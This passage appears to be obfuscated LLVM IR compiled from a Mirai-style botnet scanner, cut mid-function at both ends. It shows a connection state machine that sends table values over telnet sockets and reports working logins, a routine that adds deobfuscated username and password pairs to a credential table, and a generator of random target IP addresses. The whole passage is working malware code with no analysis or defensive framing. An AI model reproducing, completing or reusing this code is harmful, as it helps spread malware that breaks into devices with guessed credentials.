  %1176 = zext i8 %1175 to i32
  %1177 = icmp eq i32 %1176, 0
  %1178 = select i1 %1177, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0)
  %1179 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1180 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1179, i32 0, i32 12
  %1181 = load i8, i8* %1180, align 1
  %1182 = zext i8 %1181 to i32
  %1183 = load %struct.binary*, %struct.binary** %7, align 8
  %1184 = getelementptr inbounds %struct.binary, %struct.binary* %1183, i32 0, i32 1
  %1185 = load i8, i8* %1184, align 8
  %1186 = zext i8 %1185 to i32
  %1187 = sub i32 0, 1
  %1188 = add i32 %1186, %1187
  %1189 = sub nsw i32 %1186, 1
  %1190 = icmp sge i32 %1182, %1188
  %1191 = select i1 %1190, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i32 0, i32 0)
  %1192 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1193 = call i32 (i32, i8*, ...) @fdsend(i32 %1164, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i32 0, i32 0), i8* %1172, i8* %1178, i8* %1191, i8* %1192)
  call void @table_lock_val(i8 zeroext 11)
  %1194 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1195 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1194, i32 0, i32 12
  %1196 = load i8, i8* %1195, align 1
  %1197 = zext i8 %1196 to i32
  %1198 = load %struct.binary*, %struct.binary** %7, align 8
  %1199 = getelementptr inbounds %struct.binary, %struct.binary* %1198, i32 0, i32 1
  %1200 = load i8, i8* %1199, align 8
  %1201 = zext i8 %1200 to i32
  %1202 = icmp slt i32 %1197, %1201
  br i1 %1202, label %1203, label %1215

; <label>:1203:                                   ; preds = %1161
  %1204 = load %struct.binary*, %struct.binary** %7, align 8
  %1205 = bitcast %struct.binary* %1204 to i8*
  call void @free(i8* %1205) #7
  %1206 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1207 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1206, i32 0, i32 12
  %1208 = load i8, i8* %1207, align 1
  %1209 = add i8 %1208, -121
  %1210 = add i8 %1209, 1
  %1211 = sub i8 %1210, -121
  %1212 = add i8 %1208, 1
  store i8 %1211, i8* %1207, align 1
  %1213 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1214 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1213, i32 0, i32 16
  store i32 11, i32* %1214, align 8
  br label %1271

; <label>:1215:                                   ; preds = %1161
  %1216 = load %struct.binary*, %struct.binary** %7, align 8
  %1217 = bitcast %struct.binary* %1216 to i8*
  call void @free(i8* %1217) #7
  %1218 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1219 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1218, i32 0, i32 16
  store i32 13, i32* %1219, align 8
  br label %1220

; <label>:1220:                                   ; preds = %1215, %1143
  br label %1271

; <label>:1221:                                   ; preds = %849
  %1222 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1223 = call i32 @consume_method_resonse(%struct.scanner_connection* %1222)
  store i32 %1223, i32* %35, align 4
  %1224 = icmp sgt i32 %1223, 0
  br i1 %1224, label %1225, label %1235

; <label>:1225:                                   ; preds = %1221
  %1226 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1227 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1226, i32 0, i32 15
  %1228 = load i32, i32* %1227, align 4
  %1229 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1230 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1229, i32 0, i32 13
  %1231 = load i16, i16* %1230, align 8
  %1232 = zext i16 %1231 to i32
  %1233 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %1228, i32 %1232, %struct.scanner_connection* %1233, i32 1)
  %1234 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1234, i32 1)
  br label %1269

; <label>:1235:                                   ; preds = %1221
  %1236 = load i32, i32* %35, align 4
  %1237 = icmp eq i32 %1236, -1
  br i1 %1237, label %1238, label %1262

; <label>:1238:                                   ; preds = %1235
  %1239 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1240 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1239, i32 0, i32 16
  %1241 = load i32, i32* %1240, align 8
  %1242 = icmp eq i32 %1241, 11
  br i1 %1242, label %1249, label %1243

; <label>:1243:                                   ; preds = %1238
  %1244 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1245 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1244, i32 0, i32 1
  %1246 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1245, i32 0, i32 1
  %1247 = load i32, i32* %1246, align 4
  %1248 = icmp eq i32 %1247, 0
  br i1 %1248, label %1249, label %1251

; <label>:1249:                                   ; preds = %1243, %1238
  %1250 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1250, i32 1)
  br label %1271

; <label>:1251:                                   ; preds = %1243
  %1252 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1252, i32 0, i32 1
  %1254 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1253, i32 0, i32 1
  store i32 0, i32* %1254, align 4
  %1255 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1256 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1255, i32 0, i32 16
  store i32 11, i32* %1256, align 8
  call void @table_unlock_val(i8 zeroext 11)
  %1257 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1258 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1257, i32 0, i32 2
  %1259 = load i32, i32* %1258, align 8
  %1260 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1261 = call i32 (i32, i8*, ...) @fdsend(i32 %1259, i8* %1260)
  call void @table_lock_val(i8 zeroext 11)
  br label %1271

; <label>:1262:                                   ; preds = %1235
  %1263 = load i32, i32* %35, align 4
  %1264 = icmp eq i32 %1263, -2
  br i1 %1264, label %1265, label %1267

; <label>:1265:                                   ; preds = %1262
  %1266 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1266, i32 1)
  br label %1271

; <label>:1267:                                   ; preds = %1262
  br label %1268

; <label>:1268:                                   ; preds = %1267
  br label %1269

; <label>:1269:                                   ; preds = %1268, %1225
  br label %1271

; <label>:1270:                                   ; preds = %849
  store i32 0, i32* %35, align 4
  br label %1271

; <label>:1271:                                   ; preds = %1270, %1269, %1265, %1251, %1249, %1220, %1203, %1159, %1152, %1142, %1094, %1075, %1064, %1016, %1003, %985, %968, %936, %894, %877, %860
  %1272 = load i32, i32* %35, align 4
  %1273 = icmp eq i32 %1272, 0
  br i1 %1273, label %1274, label %1275

; <label>:1274:                                   ; preds = %1271
  br label %1315

; <label>:1275:                                   ; preds = %1271
  %1276 = load i32, i32* %35, align 4
  %1277 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1278 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1277, i32 0, i32 4
  %1279 = load i32, i32* %1278, align 8
  %1280 = icmp sgt i32 %1276, %1279
  br i1 %1280, label %1281, label %1285

; <label>:1281:                                   ; preds = %1275
  %1282 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1283 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1282, i32 0, i32 4
  %1284 = load i32, i32* %1283, align 8
  store i32 %1284, i32* %35, align 4
  br label %1285

; <label>:1285:                                   ; preds = %1281, %1275
  %1286 = load i32, i32* %35, align 4
  %1287 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1288 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1287, i32 0, i32 4
  %1289 = load i32, i32* %1288, align 8
  %1290 = sub i32 %1289, -1991522556
  %1291 = sub i32 %1290, %1286
  %1292 = add i32 %1291, -1991522556
  %1293 = sub nsw i32 %1289, %1286
  store i32 %1292, i32* %1288, align 8
  %1294 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1295 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1294, i32 0, i32 7
  %1296 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1295, i32 0, i32 0
  %1297 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1298 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1297, i32 0, i32 7
  %1299 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1298, i32 0, i32 0
  %1300 = load i32, i32* %35, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds i8, i8* %1299, i64 %1301
  %1303 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1304 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1303, i32 0, i32 4
  %1305 = load i32, i32* %1304, align 8
  %1306 = sext i32 %1305 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1296, i8* %1302, i64 %1306, i32 1, i1 false)
  %1307 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1308 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1307, i32 0, i32 7
  %1309 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1310 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1309, i32 0, i32 4
  %1311 = load i32, i32* %1310, align 8
  %1312 = sext i32 %1311 to i64
  %1313 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1308, i64 0, i64 %1312
  store i8 0, i8* %1313, align 1
  br label %1314

; <label>:1314:                                   ; preds = %1285
  br label %849

; <label>:1315:                                   ; preds = %1274
  br label %754

; <label>:1316:                                   ; preds = %837, %759
  br label %1317

; <label>:1317:                                   ; preds = %1316, %729
  br label %1318

; <label>:1318:                                   ; preds = %1317, %703, %674
  %1319 = load i32, i32* %1, align 4
  %1320 = sub i32 0, %1319
  %1321 = sub i32 0, 1
  %1322 = add i32 %1320, %1321
  %1323 = sub i32 0, %1322
  %1324 = add nsw i32 %1319, 1
  store i32 %1323, i32* %1, align 4
  br label %662

; <label>:1325:                                   ; preds = %662
  br label %239
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = sub i32 0, 1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, 1
  %14 = sext i32 %12 to i64
  %15 = mul i64 %14, 24
  %16 = call i8* @realloc(i8* %9, i64 %15) #7
  %17 = bitcast i8* %16 to %struct.scanner_auth*
  store %struct.scanner_auth* %17, %struct.scanner_auth** @auth_table, align 8
  %18 = load i8*, i8** %4, align 8
  %19 = call i8* @deobf(i8* %18, i32* %7)
  %20 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %21 = load i32, i32* @auth_table_len, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %20, i64 %22
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %23, i32 0, i32 0
  store i8* %19, i8** %24, align 8
  %25 = load i32, i32* %7, align 4
  %26 = trunc i32 %25 to i8
  %27 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %28 = load i32, i32* @auth_table_len, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %27, i64 %29
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %30, i32 0, i32 4
  store i8 %26, i8* %31, align 4
  %32 = load i8*, i8** %5, align 8
  %33 = call i8* @deobf(i8* %32, i32* %7)
  %34 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %35 = load i32, i32* @auth_table_len, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %34, i64 %36
  %38 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i32 0, i32 1
  store i8* %33, i8** %38, align 8
  %39 = load i32, i32* %7, align 4
  %40 = trunc i32 %39 to i8
  %41 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %42 = load i32, i32* @auth_table_len, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %41, i64 %43
  %45 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %44, i32 0, i32 5
  store i8 %40, i8* %45, align 1
  %46 = load i16, i16* @auth_table_max_weight, align 2
  %47 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %48 = load i32, i32* @auth_table_len, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %47, i64 %49
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %50, i32 0, i32 2
  store i16 %46, i16* %51, align 8
  %52 = load i16, i16* @auth_table_max_weight, align 2
  %53 = zext i16 %52 to i32
  %54 = load i16, i16* %6, align 2
  %55 = zext i16 %54 to i32
  %56 = sub i32 0, %53
  %57 = sub i32 0, %55
  %58 = add i32 %56, %57
  %59 = sub i32 0, %58
  %60 = add nsw i32 %53, %55
  %61 = trunc i32 %59 to i16
  %62 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %63 = load i32, i32* @auth_table_len, align 4
  %64 = sub i32 %63, -1438066411
  %65 = add i32 %64, 1
  %66 = add i32 %65, -1438066411
  %67 = add nsw i32 %63, 1
  store i32 %66, i32* @auth_table_len, align 4
  %68 = sext i32 %63 to i64
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %62, i64 %68
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 3
  store i16 %61, i16* %70, align 2
  %71 = load i16, i16* %6, align 2
  %72 = zext i16 %71 to i32
  %73 = load i16, i16* @auth_table_max_weight, align 2
  %74 = zext i16 %73 to i32
  %75 = sub i32 0, %74
  %76 = sub i32 0, %72
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, %72
  %80 = trunc i32 %78 to i16
  store i16 %80, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8], align 1
  %3 = alloca i32, align 4
  br label %4

; <label>:4:                                      ; preds = %31, %0
  %5 = call i32 @rand_next()
  %6 = urem i32 %5, 255
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  store i8 %7, i8* %8, align 1
  %9 = call i32 @rand_next()
  %10 = urem i32 %9, 255
  %11 = trunc i32 %10 to i8
  %12 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  store i8 %11, i8* %12, align 1
  %13 = call i32 @rand_next()
  %14 = urem i32 %13, 255
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  store i8 %15, i8* %16, align 1
  %17 = call i32 @rand_next()
  %18 = urem i32 %17, 255
  %19 = trunc i32 %18 to i8
  %20 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  store i8 %19, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %23 = load i8, i8* %22, align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %31, label %26

; <label>:26:                                     ; preds = %21
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  br label %31

; <label>:31:                                     ; preds = %26, %21
  %32 = phi i1 [ true, %21 ], [ %30, %26 ]
  br i1 %32, label %4, label %33

; <label>:33:                                     ; preds = %31
  %34 = call i32 @rand_next()
  %35 = urem i32 %34, 35
  store i32 %35, i32* %3, align 4
  %36 = load i32, i32* %3, align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %88

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = shl i32 %41, 16
  %43 = and i32 1996488704, %42
  %44 = xor i32 1996488704, %42
  %45 = or i32 %43, %44
  %46 = or i32 1996488704, %42
  %47 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = shl i32 %49, 8
  %51 = xor i32 %45, -1
  %52 = xor i32 %50, -1
  %53 = xor i32 430334486, -1
  %54 = and i32 %51, 430334486
  %55 = and i32 %45, %53
  %56 = and i32 %52, 430334486
  %57 = and i32 %50, %53
  %58 = or i32 %54, %55
  %59 = or i32 %56, %57
  %60 = xor i32 %58, %59
  %61 = or i32 %51, %52
  %62 = xor i32 %61, -1
  %63 = or i32 430334486, %53
  %64 = and i32 %62, %63
  %65 = or i32 %60, %64
  %66 = or i32 %45, %50
  %67 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %68 = load i8, i8* %67, align 1
  %69 = zext i8 %68 to i32
  %70 = shl i32 %69, 0
  %71 = xor i32 %65, -1
  %72 = xor i32 %70, -1
  %73 = xor i32 -510587268, -1
  %74 = and i32 %71, -510587268
  %75 = and i32 %65, %73
  %76 = and i32 %72, -510587268
  %77 = and i32 %70, %73
  %78 = or i32 %74, %75
  %79 = or i32 %76, %77
  %80 = xor i32 %78, %79
  %81 = or i32 %71, %72
  %82 = xor i32 %81, -1
  %83 = or i32 -510587268, %73
  %84 = and i32 %82, %83
  %85 = or i32 %80, %84
  %86 = or i32 %65, %70
  %87 = call i32 @htonl(i32 %85) #9
  store i32 %87, i32* %1, align 4
  br label %487

; <label>:88:                                     ; preds = %33
  %89 = load i32, i32* %3, align 4
  %90 = icmp eq i32 %89, 1
  br i1 %90, label %91, label %121

; <label>:91:                                     ; preds = %88
  %92 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %93 = load i8, i8* %92, align 1
  %94 = zext i8 %93 to i32
  %95 = shl i32 %94, 8
  %96 = xor i32 2006777856, -1
  %97 = xor i32 %95, -1
  %98 = xor i32 910815494, -1
  %99 = and i32 %96, 910815494
  %100 = and i32 2006777856, %98
  %101 = and i32 %97, 910815494
  %102 = and i32 %95, %98
  %103 = or i32 %99, %100
  %104 = or i32 %101, %102
  %105 = xor i32 %103, %104
  %106 = or i32 %96, %97
  %107 = xor i32 %106, -1
  %108 = or i32 910815494, %98
  %109 = and i32 %107, %108
  %110 = or i32 %105, %109
  %111 = or i32 2006777856, %95
  %112 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = shl i32 %114, 0
  %116 = and i32 %110, %115
  %117 = xor i32 %110, %115
  %118 = or i32 %116, %117
  %119 = or i32 %110, %115
  %120 = call i32 @htonl(i32 %118) #9
  store i32 %120, i32* %1, align 4
  br label %487

; <label>:121:                                    ; preds = %88
  %122 = load i32, i32* %3, align 4
  %123 = icmp eq i32 %122, 2
  br i1 %123, label %124, label %154

; <label>:124:                                    ; preds = %121
  %125 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %126 = load i8, i8* %125, align 1
  %127 = zext i8 %126 to i32
  %128 = shl i32 %127, 8
  %129 = xor i32 2006843392, -1
  %130 = xor i32 %128, -1
  %131 = xor i32 1564478787, -1
  %132 = and i32 %129, 1564478787
  %133 = and i32 2006843392, %131
  %134 = and i32 %130, 1564478787
  %135 = and i32 %128, %131
  %136 = or i32 %132, %133
  %137 = or i32 %134, %135
  %138 = xor i32 %136, %137
  %139 = or i32 %129, %130
  %140 = xor i32 %139, -1
  %141 = or i32 1564478787, %131
  %142 = and i32 %140, %141
  %143 = or i32 %138, %142
  %144 = or i32 2006843392, %128
  %145 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = shl i32 %147, 0
  %149 = and i32 %143, %148
  %150 = xor i32 %143, %148
  %151 = or i32 %149, %150
  %152 = or i32 %143, %148
  %153 = call i32 @htonl(i32 %151) #9
  store i32 %153, i32* %1, align 4
  br label %487

; <label>:154:                                    ; preds = %121
  %155 = load i32, i32* %3, align 4
  %156 = icmp eq i32 %155, 3
  br i1 %156, label %157, label %195

; <label>:157:                                    ; preds = %154
  %158 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = shl i32 %160, 16
  %162 = and i32 1946157056, %161
  %163 = xor i32 1946157056, %161
  %164 = or i32 %162, %163
  %165 = or i32 1946157056, %161
  %166 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = shl i32 %168, 8
  %170 = and i32 %164, %169
  %171 = xor i32 %164, %169
  %172 = or i32 %170, %171
  %173 = or i32 %164, %169
  %174 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %175 = load i8, i8* %174, align 1
  %176 = zext i8 %175 to i32
  %177 = shl i32 %176, 0
  %178 = xor i32 %172, -1
  %179 = xor i32 %177, -1
  %180 = xor i32 1795222290, -1
  %181 = and i32 %178, 1795222290
  %182 = and i32 %172, %180
  %183 = and i32 %179, 1795222290
  %184 = and i32 %177, %180
  %185 = or i32 %181, %182
  %186 = or i32 %183, %184
  %187 = xor i32 %185, %186
  %188 = or i32 %178, %179
  %189 = xor i32 %188, -1
  %190 = or i32 1795222290, %180
  %191 = and i32 %189, %190
  %192 = or i32 %187, %191
  %193 = or i32 %172, %177
  %194 = call i32 @htonl(i32 %192) #9
  store i32 %194, i32* %1, align 4
  br label %487

; <label>:195:                                    ; preds = %154
  %196 = load i32, i32* %3, align 4
  %197 = icmp eq i32 %196, 4
  br i1 %197, label %198, label %236

; <label>:198:                                    ; preds = %195
  %199 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = shl i32 %201, 16
  %203 = xor i32 -1174405120, -1
  %204 = xor i32 %202, -1
  %205 = xor i32 559221463, -1
  %206 = and i32 %203, 559221463
  %207 = and i32 -1174405120, %205
  %208 = and i32 %204, 559221463
  %209 = and i32 %202, %205
  %210 = or i32 %206, %207
  %211 = or i32 %208, %209
  %212 = xor i32 %210, %211
  %213 = or i32 %203, %204
  %214 = xor i32 %213, -1
  %215 = or i32 559221463, %205
  %216 = and i32 %214, %215
  %217 = or i32 %212, %216
  %218 = or i32 -1174405120, %202
  %219 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = shl i32 %221, 8
  %223 = and i32 %217, %222
  %224 = xor i32 %217, %222
  %225 = or i32 %223, %224
  %226 = or i32 %217, %222
  %227 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = shl i32 %229, 0
  %231 = and i32 %225, %230
  %232 = xor i32 %225, %230
  %233 = or i32 %231, %232
  %234 = or i32 %225, %230
  %235 = call i32 @htonl(i32 %233) #9
  store i32 %235, i32* %1, align 4
  br label %487

; <label>:236:                                    ; preds = %195
  %237 = load i32, i32* %3, align 4
  %238 = icmp eq i32 %237, 5
  br i1 %238, label %239, label %289

; <label>:239:                                    ; preds = %236
  %240 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = shl i32 %242, 16
  %244 = xor i32 -1325400064, -1
  %245 = xor i32 %243, -1
  %246 = xor i32 2140799041, -1
  %247 = and i32 %244, 2140799041
  %248 = and i32 -1325400064, %246
  %249 = and i32 %245, 2140799041
  %250 = and i32 %243, %246
  %251 = or i32 %247, %248
  %252 = or i32 %249, %250
  %253 = xor i32 %251, %252
  %254 = or i32 %244, %245
  %255 = xor i32 %254, -1
  %256 = or i32 2140799041, %246
  %257 = and i32 %255, %256
  %258 = or i32 %253, %257
  %259 = or i32 -1325400064, %243
  %260 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %261 = load i8, i8* %260, align 1
  %262 = zext i8 %261 to i32
  %263 = shl i32 %262, 8
  %264 = xor i32 %258, -1
  %265 = xor i32 %263, -1
  %266 = xor i32 -1732284615, -1
  %267 = and i32 %264, -1732284615
  %268 = and i32 %258, %266
  %269 = and i32 %265, -1732284615
  %270 = and i32 %263, %266
  %271 = or i32 %267, %268
  %272 = or i32 %269, %270
  %273 = xor i32 %271, %272
  %274 = or i32 %264, %265
  %275 = xor i32 %274, -1
  %276 = or i32 -1732284615, %266
  %277 = and i32 %275, %276
  %278 = or i32 %273, %277
  %279 = or i32 %258, %263
  %280 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = shl i32 %282, 0
  %284 = and i32 %278, %283
  %285 = xor i32 %278, %283
  %286 = or i32 %284, %285
  %287 = or i32 %278, %283
  %288 = call i32 @htonl(i32 %286) #9
  store i32 %288, i32* %1, align 4
  br label %487

; <label>:289:                                    ; preds = %236
  %290 = load i32, i32* %3, align 4
  %291 = icmp eq i32 %290, 6
  br i1 %291, label %295, label %292

; <label>:292:                                    ; preds = %289
  %293 = load i32, i32* %3, align 4
  %294 = icmp eq i32 %293, 7
  br i1 %294, label %295, label %337

; <label>:295:                                    ; preds = %292, %289
  %296 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = shl i32 %298, 8
  %300 = xor i32 1022558208, -1
  %301 = xor i32 %299, -1
  %302 = xor i32 213963659, -1
  %303 = and i32 %300, 213963659
  %304 = and i32 1022558208, %302
  %305 = and i32 %301, 213963659
  %306 = and i32 %299, %302
  %307 = or i32 %303, %304
  %308 = or i32 %305, %306
  %309 = xor i32 %307, %308
  %310 = or i32 %300, %301
  %311 = xor i32 %310, -1
  %312 = or i32 213963659, %302
  %313 = and i32 %311, %312
  %314 = or i32 %309, %313
  %315 = or i32 1022558208, %299
  %316 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %317 = load i8, i8* %316, align 1
  %318 = zext i8 %317 to i32
  %319 = shl i32 %318, 0
  %320 = xor i32 %314, -1
  %321 = xor i32 %319, -1
  %322 = xor i32 -1858156827, -1
  %323 = and i32 %320, -1858156827
  %324 = and i32 %314, %322
  %325 = and i32 %321, -1858156827
  %326 = and i32 %319, %322
  %327 = or i32 %323, %324
  %328 = or i32 %325, %326
  %329 = xor i32 %327, %328
  %330 = or i32 %320, %321
  %331 = xor i32 %330, -1
  %332 = or i32 -1858156827, %322
  %333 = and i32 %331, %332
  %334 = or i32 %329, %333
  %335 = or i32 %314, %319
  %336 = call i32 @htonl(i32 %334) #9
  store i32 %336, i32* %1, align 4
  br label %487

; <label>:337:                                    ; preds = %292
  %338 = load i32, i32* %3, align 4
  %339 = icmp eq i32 %338, 10
  br i1 %339, label %343, label %340

; <label>:340:                                    ; preds = %337
  %341 = load i32, i32* %3, align 4
  %342 = icmp eq i32 %341, 11
  br i1 %342, label %343, label %385

; <label>:343:                                    ; preds = %340, %337
  %344 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %345 = load i8, i8* %344, align 1
  %346 = zext i8 %345 to i32
  %347 = shl i32 %346, 8
  %348 = xor i32 1935802368, -1
  %349 = xor i32 %347, -1
  %350 = xor i32 1502783401, -1
  %351 = and i32 %348, 1502783401
  %352 = and i32 1935802368, %350
  %353 = and i32 %349, 1502783401
  %354 = and i32 %347, %350
  %355 = or i32 %351, %352
  %356 = or i32 %353, %354
  %357 = xor i32 %355, %356
  %358 = or i32 %348, %349
  %359 = xor i32 %358, -1
